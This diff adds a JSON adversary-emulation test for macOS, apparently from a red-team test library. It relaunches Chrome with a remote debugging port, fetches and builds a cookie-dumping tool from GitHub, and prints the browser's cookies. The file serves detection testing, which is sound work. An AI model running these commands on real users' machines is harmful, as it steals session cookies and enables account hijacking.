@@ -1,0 +1,150 @@
+{
+  "id": "e43cfdaf-3fb8-4a45-8de0-7eee8741d072",
+  "name": "Steal Chrome Cookies via Remote Debugging (Mac)",
+  "description": "The remote debugging functionality in Chrome can be used by malware for post-exploitation activities to obtain cookies without requiring keychain access. By initiating Chrome with a remote debug port, an attacker can sidestep encryption and employ Chrome's own mechanisms to access cookies.\n\nIf successful, this test will output a list of cookies.\n\nNote: Chrome processes will be killed during this test.\n\nSee https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e",
+  "platforms": [
+    "darwin"
+  ],
+  "steps": [
+    {
+      "id": "57f849f1-ec60-4059-a042-74693065e2f9",
+      "type": "execute-command",
+      "data": {
+        "command": "killall 'Google Chrome'\nsleep 1\nopen -a \"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\" --args --remote-debugging-port=1337 --remote-allow-origins=http://localhost/\nsleep 1\n/tmp/WhiteChocolateMacademiaNut/chocolate -d cookies -p 1337",
+        "command_type": "bash"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "6069fac7-9d01-4617-8e8d-74dc78cf7ab9",
+      "type": "execute-command",
+      "data": {
+        "command": "rm -rf /tmp/WhiteChocolateMacademiaNut",
+        "command_type": "bash"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "d2a6a37b-381d-4028-80f4-97e8213b4e52",
+      "name": "Check dependency 1/2",
+      "description": "Install Go",
+      "type": "execute-command",
+      "data": {
+        "command": "go version",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "a8a8e1ca-a613-48a8-938f-bbd8b01dbb4b",
+      "name": "Resolve dependency 1/2",
+      "description": "Install Go",
+      "type": "execute-command",
+      "data": {
+        "command": "brew install go",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "00e9f9b0-ba8d-4984-9304-978814c5071e",
+      "name": "Re-check dependency 1/2",
+      "description": "Install Go",
+      "type": "execute-command",
+      "data": {
+        "command": "go version",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "01a15273-1547-4fe2-9476-796eca02cd48",
+      "name": "Check dependency 2/2",
+      "description": "Download and compile WhiteChocolateMacademiaNut",
+      "type": "execute-command",
+      "data": {
+        "command": "/tmp/WhiteChocolateMacademiaNut/chocolate -h",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "0fcb41ce-e763-4e57-8a9b-a1691fd48239",
+      "name": "Resolve dependency 2/2",
+      "description": "Download and compile WhiteChocolateMacademiaNut",
+      "type": "execute-command",
+      "data": {
+        "command": "git clone https://github.com/slyd0g/WhiteChocolateMacademiaNut.git /tmp/WhiteChocolateMacademiaNut\ncd /tmp/WhiteChocolateMacademiaNut\ngo mod init chocolate\ngo mod tidy\ngo build",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "aad4a5c3-071f-427b-b098-49706fde0118",
+      "name": "Re-check dependency 2/2",
+      "description": "Download and compile WhiteChocolateMacademiaNut",
+      "type": "execute-command",
+      "data": {
+        "command": "/tmp/WhiteChocolateMacademiaNut/chocolate -h",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "57f849f1-ec60-4059-a042-74693065e2f9",
+      "p": "on-success",
+      "o": "6069fac7-9d01-4617-8e8d-74dc78cf7ab9"
+    },
+    {
+      "s": "57f849f1-ec60-4059-a042-74693065e2f9",
+      "p": "on-failure",
+      "o": "6069fac7-9d01-4617-8e8d-74dc78cf7ab9"
+    },
+    {
+      "s": "d2a6a37b-381d-4028-80f4-97e8213b4e52",
+      "p": "on-success",
+      "o": "57f849f1-ec60-4059-a042-74693065e2f9"
+    },
+    {
+      "s": "d2a6a37b-381d-4028-80f4-97e8213b4e52",
+      "p": "on-failure",
+      "o": "a8a8e1ca-a613-48a8-938f-bbd8b01dbb4b"
+    },
+    {
+      "s": "a8a8e1ca-a613-48a8-938f-bbd8b01dbb4b",
+      "p": "on-success",
+      "o": "00e9f9b0-ba8d-4984-9304-978814c5071e"
+    },
+    {
+      "s": "00e9f9b0-ba8d-4984-9304-978814c5071e",
+      "p": "on-failure",
+      "o": "57f849f1-ec60-4059-a042-74693065e2f9"
+    },
+    {
+      "s": "01a15273-1547-4fe2-9476-796eca02cd48",
+      "p": "on-success",
+      "o": "57f849f1-ec60-4059-a042-74693065e2f9"
+    },
+    {
+      "s": "01a15273-1547-4fe2-9476-796eca02cd48",
+      "p": "on-failure",
+      "o": "0fcb41ce-e763-4e57-8a9b-a1691fd48239"
+    },
+    {
+      "s": "0fcb41ce-e763-4e57-8a9b-a1691fd48239",
+      "p": "on-success",
+      "o": "aad4a5c3-071f-427b-b098-49706fde0118"
+    },
+    {
+      "s": "aad4a5c3-071f-427b-b098-49706fde0118",
+      "p": "on-failure",
+      "o": "57f849f1-ec60-4059-a042-74693065e2f9"
+    }
+  ],
+  "tags": [
+    "T1539",
+    "atomic-red-team"
+  ]
+}
